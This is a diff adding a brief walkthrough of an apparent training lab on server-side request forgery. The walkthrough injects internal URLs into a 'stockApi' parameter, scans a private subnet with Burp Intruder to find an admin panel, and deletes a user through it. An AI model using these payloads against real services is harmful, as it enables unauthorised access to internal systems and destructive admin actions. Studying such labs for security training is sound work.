@@ -1,1 +1,32 @@
 
+# Basic SSRF against another back-end system — Apprentice
+
+**Status:** Solved
+
+---
+
+## Goal
+
+Scan internal network to find admin interface on another server.
+
+---
+
+## Steps (simple & complete)
+
+1. **Find SSRF endpoint**
+- "Check stock" feature
+- Intercept:
+stockApi=http://192.168.0.1:8080/...
+2. **Scan internal IPs**
+- Use Burp Intruder
+- Set payload position:
+stockApi=http://192.168.0.§1§:8080/admin
+- Payload: Numbers 1-255
+
+3. **Find admin interface**
+- Run attack
+- Look for 200 response (others give errors)
+- Found at: `http://192.168.0.68:8080/admin`
+
+4. **Delete carlos**
+stockApi=http://192.168.0.68:8080/admin/delete?username=carlos
